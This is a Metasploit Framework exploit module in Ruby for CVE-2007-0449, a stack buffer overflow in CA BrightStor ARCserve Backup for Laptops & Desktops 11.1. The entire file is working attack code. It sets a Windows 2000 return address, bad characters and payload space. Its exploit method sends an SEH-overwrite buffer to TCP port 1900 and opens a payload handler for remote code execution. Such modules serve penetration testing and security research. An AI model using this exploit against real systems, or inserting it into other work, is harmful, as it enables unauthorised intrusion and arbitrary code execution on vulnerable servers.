##
# $Id: lgserver.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor ARCserve for Laptops & Desktops LGServer Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
				for Laptops & Desktops 11.1. By sending a specially crafted request, an attacker could
				overflow the buffer and execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-0449' ],
					[ 'OSVDB', '31593' ],
					[ 'BID', '22342' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'Windows 2000 Pro English All',		{ 'Ret' => 0x75022ac4 } ],
				],
			'DisclosureDate' => 'Jan 31 2007',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(1900)
			], self.class)
	end

	def exploit
		connect

		filler = "0000016705" + rand_text_english(2322)
		seh    = generate_seh_payload(target.ret)
		sploit = filler + seh + "\x58" * 0x4141

		print_status("Trying target #{target.name}...")

		sock.put(sploit)
		handler
		disconnect
	end

end
